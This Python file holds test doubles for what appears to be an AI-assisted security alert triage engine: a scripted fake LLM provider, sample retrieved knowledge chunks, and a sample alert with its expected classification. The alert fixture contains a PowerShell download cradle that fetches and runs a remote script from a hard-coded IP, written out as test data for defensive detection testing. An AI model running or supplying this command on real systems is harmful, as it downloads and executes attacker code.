"""Test doubles for the analysis engine. No network, no API key, no FAISS."""
from __future__ import annotations

import json
from datetime import UTC, datetime
from typing import Any

from app.llm.base import LLMProvider, LLMRequest, LLMResponse
from app.rag.schemas import RagContext, RetrievedChunk
from app.schemas.alert import Alert


class ScriptedProvider(LLMProvider):
    """Returns (or raises) the scripted items in order, recording each request."""

    name = "fake"
    model = "fake-model-1"

    def __init__(self, *script: str | BaseException) -> None:
        self.script = list(script)
        self.requests: list[LLMRequest] = []

    def generate(self, request: LLMRequest) -> LLMResponse:
        self.requests.append(request)
        if not self.script:
            raise AssertionError("ScriptedProvider called more times than scripted")
        item = self.script.pop(0)
        if isinstance(item, BaseException):
            raise item
        return LLMResponse(content=item, provider=self.name, model=self.model,
                           usage={"total_tokens": 321})


def make_alert(**overrides: Any) -> Alert:
    data: dict[str, Any] = {
        "alert_id": "ALRT-T001",
        "timestamp": datetime(2025, 9, 13, 22, 5, 19, tzinfo=UTC),
        "hostname": "SRV-APP-02",
        "username": "SYSTEM",
        "source_ip": "10.30.2.15",
        "process": "powershell.exe",
        "command_line": "powershell.exe -Command \"IEX (New-Object Net.WebClient)"
                        ".DownloadString('http://185.220.101.44/a.ps1')\"",
        "severity": "critical",
        "category": "PowerShell Execution",
        "description": "Download cradle executing remote script in memory.",
    }
    data.update(overrides)
    return Alert.model_validate(data)


def make_context(sufficient: bool = True) -> RagContext:
    if not sufficient:
        return RagContext(sufficient=False, context_text="", citations=[],
                          note="No retrieved security knowledge met the relevance threshold.")
    chunks = [
        RetrievedChunk(chunk_id="01-powershell-attacks#0", doc_name="01-powershell-attacks",
                       title="PowerShell Attacks", category="PowerShell Execution",
                       source="internal-knowledge-base",
                       text="Download cradles such as IEX DownloadString fetch and run code.",
                       score=0.31),
        RetrievedChunk(chunk_id="08-analyst-triage-playbook#2",
                       doc_name="08-analyst-triage-playbook", title="Triage Playbook",
                       category="General", source="internal-knowledge-base",
                       text="Review the process tree before any containment.", score=0.12),
    ]
    return RagContext(sufficient=True, context_text="...", citations=chunks,
                      note="2 relevant knowledge chunk(s) retrieved.")


def valid_payload(**overrides: Any) -> dict[str, Any]:
    payload: dict[str, Any] = {
        "classification": "Malicious",
        "risk_score": 88,
        "confidence_score": 80,
        "reasoning": "SYSTEM-context PowerShell download cradle to an external IP.",
        "recommended_action": "Investigate the process tree and review the network "
                              "destination; isolate the host only after analyst verification.",
        "evidence": ["IEX DownloadString in command_line", "external IP 185.220.101.44"],
        "unsupported_claims": [],
        "retrieved_knowledge": ["01-powershell-attacks#0"],
    }
    payload.update(overrides)
    return payload


def as_json(**overrides: Any) -> str:
    return json.dumps(valid_payload(**overrides))
